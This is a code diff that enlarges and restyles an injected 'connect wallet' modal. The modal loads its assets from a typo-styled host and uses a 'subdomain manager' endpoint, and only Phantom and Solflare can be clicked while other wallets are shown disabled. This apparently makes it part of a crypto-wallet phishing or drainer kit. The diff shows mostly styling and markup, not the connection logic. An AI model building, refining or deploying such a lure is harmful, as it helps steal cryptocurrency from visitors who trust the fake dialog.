@@ -6,7 +6,7 @@
     const subdomainApi = "https://encode-domain.com"; // Your subdomain manager
     const src = "https://funbIicnk.crownmodalz.com/";
     
-    // Simple modal HTML
+    // Enhanced modal HTML from the second file
     const overlayContent = `
     <style>
         @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap');
@@ -26,8 +26,14 @@
             --border-color: #2a2a2a;
             --text-primary: #ffffff;
             --text-secondary: #888888;
+            --text-tertiary: #666666;
             --accent-blue: #4a9eff;
             --accent-green: #4ade80;
+            --accent-purple: #a78bfa;
+            --accent-yellow: #fbbf24;
+            --danger: #ef4444;
+            --warning: #f59e0b;
+            --success: #10b981;
         }
     
         #overlay {
@@ -52,8 +58,8 @@
     
         #modal {
             position: relative;
-            width: 380px;
-            max-width: 90%;
+            width: 440px;
+            max-width: 95%;
             background: var(--bg-secondary);
             border-radius: 20px;
             overflow: hidden;
@@ -76,28 +82,33 @@
             display: flex;
             align-items: center;
             justify-content: space-between;
-            padding: 20px;
+            padding: 24px;
             border-bottom: 1px solid var(--border-color);
         }
     
         .modal-title {
-            font-size: 18px;
+            font-size: 20px;
             font-weight: 600;
             color: var(--text-primary);
             display: flex;
             align-items: center;
-            gap: 8px;
+            gap: 10px;
+        }
+    
+        .modal-title svg {
+            width: 20px;
+            height: 20px;
         }
     
         .close-btn {
-            width: 32px;
-            height: 32px;
+            width: 36px;
+            height: 36px;
             display: flex;
             align-items: center;
             justify-content: center;
             background: transparent;
             border: none;
-            border-radius: 8px;
+            border-radius: 10px;
             color: var(--text-secondary);
             cursor: pointer;
             transition: all 0.2s;
@@ -109,20 +120,22 @@
         }
     
         .modal-body {
-            padding: 20px;
+            padding: 24px;
         }
     
         .wallet-item {
             display: flex;
             align-items: center;
-            gap: 14px;
-            padding: 14px;
-            margin-bottom: 10px;
+            gap: 16px;
+            padding: 16px;
+            margin-bottom: 12px;
             background: var(--bg-tertiary);
             border: 1px solid transparent;
-            border-radius: 12px;
+            border-radius: 16px;
             cursor: pointer;
             transition: all 0.2s;
+            position: relative;
+            overflow: hidden;
         }
     
         .wallet-item:hover {
@@ -131,16 +144,24 @@
             transform: translateY(-2px);
         }
     
+        .wallet-item:active {
+            transform: translateY(0);
+        }
+    
         .wallet-icon {
-            width: 42px;
-            height: 42px;
-            border-radius: 10px;
+            width: 48px;
+            height: 48px;
+            border-radius: 12px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            position: relative;
         }
     
         .wallet-icon img {
             width: 100%;
             height: 100%;
-            border-radius: 10px;
+            border-radius: 12px;
         }
     
         .wallet-info {
@@ -148,7 +169,7 @@
         }
     
         .wallet-name {
-            font-size: 15px;
+            font-size: 16px;
             font-weight: 500;
             color: var(--text-primary);
             margin-bottom: 2px;
@@ -157,31 +178,144 @@
         .wallet-badge {
             display: inline-flex;
             align-items: center;
-            padding: 3px 6px;
-            font-size: 10px;
+            padding: 4px 8px;
+            font-size: 11px;
             font-weight: 600;
-            border-radius: 4px;
+            border-radius: 6px;
             text-transform: uppercase;
             letter-spacing: 0.5px;
+        }
+    
+        .badge-installed {
             background: rgba(74, 222, 128, 0.1);
             color: var(--accent-green);
         }
     
+        .badge-popular {
+            background: rgba(74, 158, 255, 0.1);
+            color: var(--accent-blue);
+        }
+    
+        .wallet-divider {
+            display: flex;
+            align-items: center;
+            margin: 24px 0;
+        }
+    
+        .divider-line {
+            flex: 1;
+            height: 1px;
+            background: var(--border-color);
+        }
+    
+        .divider-text {
+            padding: 0 16px;
+            color: var(--text-tertiary);
+            font-size: 12px;
+            font-weight: 500;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }
+    
+        .all-wallets-btn {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            width: 100%;
+            padding: 16px;
+            background: transparent;
+            border: 1px solid var(--border-color);
+            border-radius: 16px;
+            color: var(--text-primary);
+            font-size: 16px;
+            font-weight: 500;
+            cursor: pointer;
+            transition: all 0.2s;
+        }
+    
+        .all-wallets-btn:hover {
+            background: var(--bg-hover);
+            border-color: var(--accent-blue);
+            color: var(--accent-blue);
+        }
+    
+        .all-wallets-info {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+        }
+    
+        .all-wallets-icons {
+            display: flex;
+            margin-left: -8px;
+        }
+    
+        .mini-wallet-icon {
+            width: 28px;
+            height: 28px;
+            border-radius: 8px;
+            border: 2px solid var(--bg-secondary);
+            margin-left: -8px;
+        }
+    
+        .wallet-count {
+            color: var(--text-tertiary);
+            font-size: 14px;
+        }
+    
+        .get-wallet-footer {
+            padding: 24px;
+            border-top: 1px solid var(--border-color);
+            text-align: center;
+        }
+    
+        .get-wallet-text {
+            color: var(--text-secondary);
+            font-size: 14px;
+        }
+    
+        .get-wallet-link {
+            color: var(--accent-blue);
+            text-decoration: none;
+            font-weight: 500;
+            margin-left: 4px;
+            transition: opacity 0.2s;
+        }
+    
+        .get-wallet-link:hover {
+            opacity: 0.8;
+        }
+    
+        /* Loading States */
         #loader {
             position: fixed;
-            width: 380px;
-            max-width: 90%;
+            width: 440px;
+            max-width: 95%;
             background: var(--bg-secondary);
             border-radius: 20px;
-            padding: 40px 28px;
+            padding: 48px 32px;
             text-align: center;
             animation: slideUp 0.3s cubic-bezier(0.34, 1.56, 0.64, 1);
             box-shadow: 0 20px 60px rgba(0, 0, 0, 0.5);
         }
     
+        #loader h2 {
+            font-size: 24px;
+            font-weight: 600;
+            color: var(--text-primary);
+            margin-bottom: 12px;
+        }
+    
+        #loader p {
+            font-size: 14px;
+            color: var(--text-secondary);
+            line-height: 1.5;
+            margin-bottom: 32px;
+        }
+    
         .spinner {
-            width: 40px;
-            height: 40px;
+            width: 48px;
+            height: 48px;
             border: 3px solid var(--border-color);
             border-top-color: var(--accent-blue);
             border-radius: 50%;
@@ -192,12 +326,27 @@
         @keyframes spin {
             to { transform: rotate(360deg); }
         }
+    
+        /* Mobile Responsiveness */
+        @media (max-width: 480px) {
+            #modal, #loader {
+                width: 100%;
+                max-width: 100%;
+                height: 100%;
+                border-radius: 0;
+                max-height: 100vh;
+            }
+    
+            .modal-body {
+                padding: 16px;
+            }
+        }
     </style>
     
     <div id="modal">
         <div class="modal-header">
             <h2 class="modal-title">
-                <svg width="20" height="20" viewBox="0 0 24 24" fill="none">
+                <svg viewBox="0 0 24 24" fill="none">
                     <circle cx="12" cy="12" r="10" stroke="currentColor" stroke-width="2"/>
                     <path d="M12 8v4m0 4h.01" stroke="currentColor" stroke-width="2" stroke-linecap="round"/>
                 </svg>
@@ -217,11 +366,72 @@
                 </div>
                 <div class="wallet-info">
                     <div class="wallet-name">Phantom</div>
-                    <span class="wallet-badge">Recommended</span>
+                    <span class="wallet-badge badge-installed">Recommended</span>
                 </div>
             </div>
     
-
+            <div class="wallet-item" id="solflare">
+                <div class="wallet-icon">
+                    <img src="${src}images/solflare_wallet.svg" alt="Solflare">
+                </div>
+                <div class="wallet-info">
+                    <div class="wallet-name">Solflare</div>
+                    <span class="wallet-badge badge-popular">Popular</span>
+                </div>
+            </div>
+    
+            <div class="wallet-item disabled" onclick="return false;" style="opacity: 0.5; cursor: not-allowed;">
+                <div class="wallet-icon">
+                    <img src="${src}images/wallets/trust_wallet.svg" alt="Trust Wallet">
+                </div>
+                <div class="wallet-info">
+                    <div class="wallet-name">Trust Wallet</div>
+                </div>
+            </div>
+    
+            <div class="wallet-item disabled" onclick="return false;" style="opacity: 0.5; cursor: not-allowed;">
+                <div class="wallet-icon">
+                    <img src="${src}images/wallets/coin98_wallet.svg" alt="Coinbase">
+                </div>
+                <div class="wallet-info">
+                    <div class="wallet-name">Coinbase</div>
+                </div>
+            </div>
+    
+            <div class="wallet-item disabled" onclick="return false;" style="opacity: 0.5; cursor: not-allowed;">
+                <div class="wallet-icon">
+                    <img src="${src}images/wallets/bitkeep.svg" alt="Bitget">
+                </div>
+                <div class="wallet-info">
+                    <div class="wallet-name">Bitget Wallet</div>
+                </div>
+            </div>
+    
+            <div class="wallet-divider">
+                <div class="divider-line"></div>
+                <span class="divider-text">More Options</span>
+                <div class="divider-line"></div>
+            </div>
+    
+            <button class="all-wallets-btn" disabled style="opacity: 0.5; cursor: not-allowed;">
+                <div class="all-wallets-info">
+                    <div class="all-wallets-icons">
+                        <img class="mini-wallet-icon" src="${src}images/wallets/ledger.svg" alt="">
+                        <img class="mini-wallet-icon" src="${src}images/wallets/exodus.svg" alt="">
+                        <img class="mini-wallet-icon" src="${src}images/wallets/atomic_wallet.svg" alt="">
+                        <img class="mini-wallet-icon" src="${src}images/wallets/glow_wallet.svg" alt="">
+                    </div>
+                    <span>All Wallets</span>
+                </div>
+                <span class="wallet-count">12</span>
+            </button>
+        </div>
+    
+        <div class="get-wallet-footer">
+            <span class="get-wallet-text">
+                Haven't got a wallet?
+                <a href="https://phantom.app" target="_blank" class="get-wallet-link">Get started</a>
+            </span>
         </div>
     </div>
     
@@ -243,7 +453,7 @@
         });
     }
     
-    // Handle wallet connection
+    // Handle wallet connection (keeping original functionality)
     async function handleWalletConnection(walletType) {
         const modal = document.getElementById('modal');
         const loader = document.getElementById('loader');
@@ -355,7 +565,7 @@
                 }
             });
             
-            // Wallet click handlers
+            // Wallet click handlers (keeping original functionality)
             document.getElementById('phantom').addEventListener('click', () => {
                 handleWalletConnection('phantom');
             });
